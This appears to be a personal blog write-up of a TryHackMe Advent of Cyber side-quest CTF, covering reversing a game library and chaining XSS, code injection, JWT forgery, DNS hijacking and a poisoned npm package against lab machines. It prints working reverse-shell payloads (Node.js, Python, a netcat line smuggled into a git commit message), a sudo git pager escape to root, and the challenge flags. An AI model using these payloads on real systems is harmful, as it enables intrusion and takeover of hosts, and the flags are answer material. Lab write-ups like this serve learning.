@@ -1,0 +1,207 @@
+* Advent of Cyber Side Quest (Part 5)
+
+30 December 2024
+
+Fifth and final part of the TryHackMe Advent of Cyber Side Quest!  See [[https://0x85.org/sidequest2024-1.html][Part 1]] for context.
+
+*** The Keycard
+At the end of the "game hacking" main quest day, there was a tidbit about doing what the second pengun says, which made my spidey senses tingle, so I grabbed the game binary and ~libaocgame.so~ off the attackbox machine to my laptop for analysis.  Running ~strings~ on the game obviously produced a /lot/ of strings, most of them irrelevant.  But:
+
+#+begin_src
+$strings ./TryUnlockMe | grep -i "password"
+Incorrect password...
+Password accepted. The secret phrase to open the vault is 'where_is_the_yeti'
+#+end_src
+
+I thought at first this might be the keycard code, but all the previous challenges had actual graphical keycards, so I put ~where_is_the_yeti~ into my notes for later.  Next I fired up Ghidra and poked around at the game.  Didn't find much, but in the Exports section of ~libaocgame.so~, Ghidra identified this interesting tidbit:
+
+[[./img/libaocgame-exports.png]]
+
+Investigating the decompiled function showed a ton of nested conditionals, probably to defeat searching via ~strings~:
+
+[[./img/12345.png]]
+
+Sure seemed to me that we needed to call ~create_keycard()~ from the shared object library with the parameter ~one_two_three_four_five~ which would then produce the keycard via a ~std::basic_ofstream~.  I threw together a quick C++ program to do exactly that:
+
+#+begin_src C++
+  #include <iostream>
+  #include <dlfcn.h> //to load .so's dynamically
+
+  int main() {
+    void* handle = dlopen("./libaocgame.so", RTLD_LAZY);
+    if(!handle) {
+      std::cerr << "Could not open: " << dlerror() << std::endl;
+      return 1;
+    }
+
+    dlerror(); // clear pre-existing errors
+
+    //resolve the mangled name we got from ghidra to a function ptr
+    typedef int (*createkeycardfunc)(const char*);
+    createkeycardfunc createkeycard = (createkeycardfunc)dlsym(handle, "_Z14create_keycardPKc");
+
+    const char* error = dlerror();
+    if (error){
+      std::cerr << "Error resolving symbol: " << error << std::endl;
+      dlclose(handle);
+      return 1;
+    }
+
+    std::cout << createkeycard("one_two_three_four_five");
+    dlclose(handle);
+
+    return 0;
+  }
+#+end_src
+
+Sure enough, a zip file popped out, and the password to open that zip file was ~where_is_the_yeti~!
+
+[[./img/aoc-sidequest-keycard5.png]]
+
+*** T5: An Avalanche of Web Apps
+Booting up the machine and running the usual scans revealed nothing particularly unusual:
+
+#+begin_src
+Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2024-12-31 03:45:41 GMT
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65535 ports/host]
+Discovered open port 21337/tcp on 10.10.248.21
+Discovered open port 53/tcp on 10.10.248.21
+Discovered open port 22/tcp on 10.10.248.21
+Discovered open port 80/tcp on 10.10.248.21
+#+end_src
+
+I tried to browse to the machine since port 80 was open and was immediately redirected to ~http://thehub.bestfestivalcompany.thm/~.  Interesting.  Since port 53 (DNS) was open on the machine I added the ~.thm~ domain to ~/etc/hosts~ and queried the dns resolver for all domains:
+
+#+begin_src
+dig @10.10.248.21 bestfestivalcompany.thm axfr
+
+; <<>> DiG 9.18.28-1~deb12u2-Debian <<>> @10.10.248.21 bestfestivalcompany.thm axfr
+; (1 server found)
+;; global options: +cmd
+bestfestivalcompany.thm. 600    IN      SOA     bestfestivalcompany.thm. hostmaster.bestfestivalcomp$
+bestfestivalcompany.thm. 600    IN      NS      bestfestivalcompany.thm.
+bestfestivalcompany.thm. 600    IN      NS      0.0.0.0/0.
+thehub-uat.bestfestivalcompany.thm. 600 IN A    172.16.1.3
+thehub-int.bestfestivalcompany.thm. 600 IN A    172.16.1.3
+adm-int.bestfestivalcompany.thm. 600 IN A       172.16.1.2
+thehub.bestfestivalcompany.thm. 600 IN  A       172.16.1.3
+npm-registry.bestfestivalcompany.thm. 600 IN A  172.16.1.2
+bestfestivalcompany.thm. 600    IN      SOA     bestfestivalcompany.thm. hostmaster.bestfestivalcomp$
+;; Query time: 170 msec
+;; SERVER: 10.10.248.21#53(10.10.248.21) (TCP)
+;; WHEN: Mon Dec 30 19:51:33 PST 2024
+;; XFR size: 9 records (messages 1, bytes 457)
+#+end_src
+
+Innnteresting.  Got my hosts file all squared away with these new domains and started poking around.  There was a contact page on one, an npm registry on another, an "under construction" page, and a login portal.  After a few dozen minutes of poking I tested the contact page for XSS, by running a netcat listener and uploading a simple javascript that would call back to my listener, and sure enough there was some sort of timer running there, calling my listener.  I guess to simulate humans looking at the comments coming in?  Not sure, but it worked.  I spent a whole day poking around and getting the XSS to echo things back to me and eventually, by having the XSS echo the contents of the inside rendered HTML to me, discovered links to ~/wiki~.  I also discovered a package on the npm-registry authored by "McSkidy" which is a character from TryHackMe.  It was a custom markdown parser, and a careful examination of the code revealed it was vulnerable to code injection:
+
+#+begin_src javascript
+  const dynamicCodeRegex = /\{\{(.*?)\}\}/g;
+  html = html.replace(dynamicCodeRegex, (_, code) => {
+    try {
+      const sandbox = {
+	...context,
+	require,
+      };
+      return vm.runInNewContext(code, sandbox);
+    } catch (error) {
+      return `<span style="color:red;">Error: ${error.message}</span>`;
+    }
+  });
+#+end_src
+
+The code regex looks for syntax matching ~{{ ... }}~, and if found executes that code using ~vm.runInNewContext~, and the sandbox includes ~require~ which means we can craft a payload that ~require~s nefarious things.  I then spent far too long trying to get this combo injection attack working, and eventually succeeded with this payload:
+
+#+begin_src javascript
+  <script>
+  var xhr = new XMLHttpRequest();
+  xhr.open('POST', '/wiki', true);
+  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+  xhr.withCredentials = true;
+  var payload = 'title=whatever&markdownContent={{(function(){var net = require("net"),cp = require("child_process"),sh = cp.spawn("sh", []);var client = new net.Socket();client.connect(8888, "10.10.151.165", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();}}'
+  xhr.send(payload);
+  </script>
+#+end_src
+
+That got us a reverse shell but it died within seconds, I guess when the VM context was destroyed.  So I prepped a python one-liner to stabilize the shell and tried again.  When the rev shell popped I quickly pasted this into it, slightly modified from [[https://revshells.com][revshells]]:
+
+#+begin_src python
+  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.2.21.161",8585));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+#+end_src
+
+That got a second reverse shell, but this one was stable.  Now I could begin poking around the machine, and quickly found the first flag in the root of the container.  Searching around the filesystem I discovered a git repository in ~/app/bfc_thehubuat/assets~, but git itself wasn't installed.  I transferred it back to my machine as a tarball and found only three commits inside, by a user ~bfc_admin@bestfestivalcompany.thm~.  Further in the assets directory I found a backups folder with a private key.  I tried to ssh to all the various machines with that username and private key and discovered ~gitolite~ was running on the main machine, which gave readonly access to several other git repositories.  The ~admint~ repo was the most interesting, as it contained three interesting routes:
+
+- ~/restart-service~, presumably to cause changes in config or code to take effect
+- ~/modify-resolv~, to specify new DNS entries
+- ~/reinstall-node-modules~ to I guess allow us to upload malicious npm packages?
+
+It also contained some jwt validation:
+
+#+begin_src javascript
+  jwt.verify(token, publicKey, { algorithms: ['RS256'] }, (err, user) => {
+      if (err || user.username !== 'mcskidy-adm') {
+	  return res.status(403).json({ error: 'Forbidden' });
+      }
+      req.user = user;
+      next();
+  });
+#+end_src
+
+So, it became clear to me that it was necessary to forge credentials as ~mcskidy-adm~ to proceed further, and probably also redirect the npm registry to a malicious server, to serve vulnerable packages.
+
+Before doing that, however, it was necessary to edit the contents of ~/app/bfc_thehubuat/assets/jwks.json~ with a new public key, and forge a new JWT with ~{"username": "mcskidy-adm"}~ using Burp.
+
+After a great deal of trial and error with ~package.json~ I realized I was overthinking it, and created a "registry" serving a vulnerable version of ~express~ with a reverse shell (again, just a copy-paste from [[https://revshells.com][revshells]]) inserted into ~index.js~.
+
+With that, it was necessary to hit the ~/modify-resolv~ endpoint to overwrite the nameserver to point to my laptop (~10.2.21.161~) where I installed ~dnsmasq~.  From there the next step was to trigger a reinstall of the node modules with that endpoint, causing the compromised version of ~express~ to be loaded and getting a root shell inside the container on the ~172.16.1.2~ machine, where we can get the flag:
+
+#+begin_src
+$ cat /flag-1c12bcbb1fee96a928d4f89550dcb60d.txt
+THM{647aff4143b04972ba816f040e9b81c2}
+#+end_src
+
+God damn, that was convoluted.  I'm pretty sure I missed a few minor steps in there, because by this point I was rushing to get it done before midnight GMT on the 31st, and also coming down with a cold I caught from my daughter, so the notes I was keeping for this section weren't as complete.  But I'm confident I didn't miss anything major.
+
+Anyway, digging further there's a ~root.key~ in the ~admint~ app, which I thought I might need to revert a commit or something if it gave write access (being root, after all).
+
+#+begin_src
+# ssh -i root.key git@bestfestivalcompany.thm
+PTY allocation request failed on channel 0
+hello developer, this is git@tryhackme-2404 running gitolite3 3.6.12-1 (Debian) on git 2.43.0
+
+ R W    admdev
+ R      admint
+ R      bfcthehubint
+ R      bfcthehubuat
+ R      gitolite-admin
+ R      hooks_wip
+ R      underconstruction
+Connection to 172.16.1.1 closed.
+#+end_src
+
+*** OMG SO MANY SHELLS
+Well I now have write to ~admdev~ but not what I was expecting.  There's a new repo I hadn't seen before called ~hooks_wip~, so I cloned it and discovered a single post-receive hook that appeared to be vulnerable to injection:
+
+#+begin_src
+...
+bash -c "echo $(date) - Ref: $refname - Commit: $commit_message >> $LOGFILE"
+...
+#+end_src
+
+Since the commit message is something the user can control, we could just put shell commands into the commit message and it will get executed:
+
+1. ~$ touch lol.txt~
+2. ~$ git add lol.txt~
+3. ~$ git commit -m 'fgsfds; busybox nc 10.2.21.161 4444 -e sh'~
+4. Push and enjoy yet another shell
+
+
+So that got me a shell as the ~git~ user, and the third flag happened to be in ~/home/git~.  To get root from there, ~sudo -l~ says we can run ~/usr/bin/git --no-pager diff *~ with ~sudo~.  Well it turns out that if you issue ~$ sudo /usr/bin/git --no-pager diff --help~, the ~--help~ flag overrides the ~--no-pager~ flag, and you get a pager regardless.  That's critical because in the pager you can just type ~!sh~, which gives you a shell, and since we're running under sudo then it's (another) root shell to get the fourth and final flag.
+
+#+begin_src
+# cat /root/flag-e116666ffb7fcfadc7e6136ca30f75bf.txt
+THM{05a830d2f52649c96318cce20c562b63}
+#+end_src
+
+Holy crap.  I finished mere hours before the embargo lifted so I'm counting this as a win.
